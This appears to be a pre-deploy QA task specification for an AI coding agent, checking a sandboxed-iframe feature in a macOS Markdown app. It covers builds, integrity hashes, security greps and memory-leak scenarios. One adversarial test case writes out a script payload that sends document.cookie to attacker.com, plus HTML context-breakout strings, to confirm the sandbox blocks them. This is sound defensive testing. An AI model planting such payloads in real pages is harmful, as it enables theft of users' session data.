# Task 12: Pre-deploy QA

## Required Skills

Before starting, load:
- `/skill:pre-deploy-qa` — [skills/pre-deploy-qa/SKILL.md](~/.claude/skills/pre-deploy-qa/SKILL.md)

## Description

Final acceptance gate for Recursive Insight v2 before commit / merge. The three preceding audits (T9 Code, T10 Security, T11 Test) produce written reports; this task uses those reports as priors and runs the executable verification that the audits cannot perform — clean build, live Anthropic `tool_use` smoke, vendored-lib SHA-256 integrity, storage spot-check, static-grep evidence for the security invariants enumerated in the tech-spec, and — most importantly — a 12-scenario Instruments → Allocations leak check covering happy-path lifecycle, error/retry, rate-limit, ZIP export, breadcrumb cache load, plus 7 adversarial scenarios (poisoned `<script>` payloads, double-click race, mid-export close, mid-Phase-2 close, `pkill -9` crash recovery, blob URL revocation under Web Inspector, KaTeX math rendering inside the sandboxed iframe).

The output is a single report at `work/recursive-insight/logs/qa/pre-deploy-qa-report.md` that either gives the green light or enumerates blockers. Findings from T9/T10/T11 audits that are still open at the time of this task are surfaced in the report (carried forward, not re-discovered). All user-spec acceptance criteria are walked through manually on `TestFiles/`. The `tasks/todo.md` v2-paths rewrite (delivered by T8 per Decision 9) is verified present and correct. No code is changed by this task — pure verification.

## What to do

1. Read the three audit reports and extract any unresolved findings to surface in the QA report:
   - `work/recursive-insight/logs/audit/code-audit.md` (T9)
   - `work/recursive-insight/logs/audit/security-audit.md` (T10)
   - `work/recursive-insight/logs/audit/test-audit.md` (T11)
2. Run a clean Debug build and capture warnings on the modified files. Compare warning count against the pre-v2 baseline (`git stash` + build on `main` + count, then restore).
3. Execute the Anthropic `tool_use` smoke `curl` against the live Messages API and confirm the response contains a `tool_use` block with `input.text == "hello"`.
4. Verify Chart.js (and every other vendored lib) by computing SHA-256 and comparing against `MarkView/Resources/Editor/vendor/MANIFEST.txt`.
5. Storage spot-check: confirm no insight-prefixed tables exist in `state.db` (sqlite `.schema`) and no `insight_*` artifact rows in `artifacts/`/`ai_jobs` tables (Decision 8 + tech-spec acceptance "No new SQLite tables created").
6. Static grep evidence for the seven security invariants (one grep per row of the tech-spec Verification Steps table, plus the escape-utility and CSP checks). Record each grep command and its output in the report.
7. **Instruments → Allocations leak run, 12 scenarios.** For each scenario: launch MarkView under Instruments (Allocations template), execute the scripted user flow, force a GC pass (close & wait, then trigger a memory pressure event via `memory_pressure -l critical -S 1`), take a generation snapshot, and assert zero retained `InsightSession` / `InsightNode` (per-node state in `session.nodes`) / `InsightCache` instances. The 12 scenarios are enumerated in the Details section.
8. Manual user-spec acceptance walkthrough on `TestFiles/`: open the folder in MarkView, run AI Tools → Analysis → 🧭 Recursive Insight, walk every checkbox in the user-spec "Критерии приёмки" list, mark pass/fail.
9. Verify `tasks/todo.md` reflects the v2 rewrite delivered by T8 (the eight v2-specific test paths are listed; v1-only modules like `InsightMarkerParserTests` are removed).
10. Verify the exported ZIP archive opens in Safari and breadcrumb navigation works between local files (no MarkView running).
11. Write the consolidated report to `work/recursive-insight/logs/qa/pre-deploy-qa-report.md`. Structure: header (date, build SHA, Xcode version, macOS version), per-section pass/fail with evidence, carried-forward audit findings, blockers list, sign-off recommendation.

## Verification Steps

### Automated

- `xcodebuild -project MarkView.xcodeproj -scheme MarkView -configuration Debug build` → BUILD SUCCEEDED, 0 errors, 0 new warnings on modified v2 files vs pre-v2 baseline.
- `shasum -a 256 MarkView/Resources/Editor/vendor/js/chart-*.min.js` and the same for every other vendored lib → output matches every line in `MarkView/Resources/Editor/vendor/MANIFEST.txt`.
- `sqlite3 ~/Library/Containers/<bundle-id>/Data/Library/Application\ Support/MarkView/state.db ".schema"` → no table name matches `insight%`.
- `grep -E 'sandbox="allow-scripts"' MarkView/Resources/Editor/index.html` → match present; `grep allow-same-origin MarkView/Resources/Editor/index.html` → no match in insight-mode block.
- `grep -n 'frameInfo.isMainFrame' MarkView/Bridge/WebViewBridge.swift` → 5 matches, one per v2 handler.
- `grep -E 'insightIframeReady|insightDeepDiveClicked|insightBreadcrumbClicked|insightRequestSave|insightRequestUp' MarkView/Resources/Editor/index.html` → exactly these 5 types appear; no other `insight*` message types.
- `grep -nE 'src="https?://|src="//|cdn\.jsdelivr|cdnjs\.cloudflare' MarkView/Resources/Editor/index.html` (filtered to insight-mode iframe srcdoc only) → no matches.
- `grep -nE "connect-src 'none'" MarkView/Resources/Editor/index.html` → match inside iframe CSP meta.
- `grep -nE 'escapeForHTMLAttribute|escapeForHTMLText' MarkView/Resources/Editor/index.html` → utility defined and called at every LLM-string interpolation site (cross-checked against grep for `${` template interpolations).

### Smoke

- `curl -N -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d '{"model":"claude-sonnet-4-6","max_tokens":256,"tools":[{"name":"echo","description":"echo back","input_schema":{"type":"object","properties":{"text":{"type":"string"}},"required":["text"]}}],"messages":[{"role":"user","content":"call echo with text=hello"}]}' https://api.anthropic.com/v1/messages` → response contains a `content` block of `type == "tool_use"` with `input.text == "hello"`.

## Details

Sections: Header (date, build SHA, Xcode version, macOS version, MarkView git ref), Build & Static Checks, Anthropic Smoke, Vendored Libs Integrity, Storage Spot-Check, Instruments Leak Matrix (12 scenarios × pass/fail × evidence), User-Spec Acceptance Walkthrough (per checkbox), Adversarial Scenarios (f-l), Open Audit Findings (carried from T9/T10/T11), Blockers, Sign-off Recommendation (GREEN / YELLOW / RED).

**Dependencies:**
- T9, T10, T11 audit reports must exist at `logs/audit/{code,security,test}-audit.md`.
- All wave 1-5 implementation tasks (T1-T8) merged.
- Anthropic API key available in environment (`$KEY`) for the live `tool_use` smoke.
- Xcode 15+, `xcodebuild`, `curl`, `shasum`, `sqlite3`, `Instruments` (from Xcode), `memory_pressure`.

**Instruments → Allocations 12 scenarios:**

Happy path:
- (a) Open insight node, expand 2-3 deep-dive children, close tab.
- (b) Error path — kill network mid Phase 2 (toggle Wi-Fi or `sudo ifconfig en0 down` then up), trigger retry, then close tab.
- (c) 4th retry within the 60s sliding rate-limit window — verify the throttle blocks; close tab.
- (d) Press 💾 Export Archive, complete the export, then close tab.
- (e) Navigate back via breadcrumb (cache load, no LLM call), then close tab.

Adversarial:
- (f) Add a `.md` with `<script>fetch("https://attacker.com/exfil?key="+document.cookie)</script>` plus context-breakout payloads `</script><script>...` and `</label></section><script>` — verify (1) no script executes in parent (sandbox null-origin + escape utility); (2) `connect-src 'none'` blocks the fetch (visible in Web Inspector Network tab as blocked); (3) `Console.app` for the MarkView process shows zero `attacker.com` strings.
- (g) Rapid double-click on a 🤿 deep-dive button — verify only one node opens (M1-class race resolved by T5/T7).
- (h) Press Export Archive, then close the insight tab while the `/usr/bin/zip` Process is still running — verify the Process is killed, staging directory removed, `.zip.tmp` removed, no partial file appears at the user destination.
- (i) Close insight tab during Phase 2 streaming — verify all parallel section tasks observe `Task.isCancelled`, `closeTab` ordering (releaseInsightBlobs → cancel → cleanup → removeTab) executes, no leftover `.tmp` files in `<workspace>/.insight-cache/<sessionUUID>/nodes/`.
- (j) `pkill -9 MarkView` mid Phase 2 → relaunch MarkView → start a new insight session — verify the new `sessionUUID` is fresh; the prior session's `.insight-cache/<old-uuid>/` exists on disk but is not read, opened, listed, or referenced (per the Decision 4 risk-table mitigation).
- (k) Open Web Inspector → Resources → Blobs panel; create a node that uses Mermaid only, navigate to a node that uses Chart.js only — verify the Mermaid blob URL is revoked (count decreases); navigate further — counts continue to track active subset, not a monotonically growing list.
- (l) Include a section with `$$E = mc^2$$` LaTeX math in skeleton metadata — verify KaTeX renders correctly inside the iframe; webfonts load (visible glyphs, not boxes / fallback fonts) via base64-inline or relative `_assets/` path; no CDN webfont request appears in Web Inspector Network.

For every scenario: Force GC by closing the relevant tab + `memory_pressure -l critical -S 1`, take a generation snapshot in Allocations, filter by `InsightSession` / `InsightNode` / `InsightCache` — count must be zero. Record screenshots / counts in the report.

**Edge cases:**
- Anthropic API down or rate-limited at QA time — record as `SKIPPED with note`, do not block ship; rerun before merge.
- `$KEY` env var missing — fail fast with a clear error in the report; this is a setup bug, not a product issue.
- Xcode Instruments unavailable on the QA machine — flag as blocker for the QA pass; cannot complete leak check section.
- Adversarial scenario (f) requires editing a `.md` file in `TestFiles/` — leave the file in place after the run with a clear comment so the next QA pass reproduces deterministically.
- Stale `.insight-cache/<old-uuid>/` from a prior failed run — clean before scenario (j) so the "ignored, not reused" assertion is meaningful.

**Implementation hints:**
- Compute the warning baseline ONCE at the start of QA: `git stash` → build `main` → grep warnings on the v2 file list → record count → `git stash pop`. Subsequent builds compare against this number.
- For the `state.db` schema check, locate the actual DB path under `~/Library/Containers/<MarkView bundle-id>/Data/Library/Application Support/MarkView/state.db` (verify by running MarkView once first).
- Allocations leak check is the longest section; budget ~2 hours for the 12 scenarios. Use a checklist in the report and tick as you go.
- The "no new warnings on modified files" check should diff against `main` warnings on the same file paths — a global warning count is misleading because v2 adds files.
- Carry-forward of audit findings: read each audit MD, find the "Findings" section, extract any item with status not equal to "resolved" / "addressed" / "won't fix", quote it verbatim into the QA report's "Open audit findings" section with the source audit name.
- For the `tasks/todo.md` v2-paths check, read the file and confirm the 8 paths from Decision 9 / T8 are present; spot-check that no v1-only references remain (e.g. `InsightMarkerParserTests`, `MarkdownInsightRenderer`, the right-pane deep-dive list).
- The sign-off recommendation should be evidence-driven: GREEN only if every acceptance criterion above is checked AND zero unresolved high/critical audit findings remain. YELLOW if non-blocking issues exist (documented). RED if any leak / sandbox / cache integrity / `frameInfo` guard / postMessage allowlist check fails.
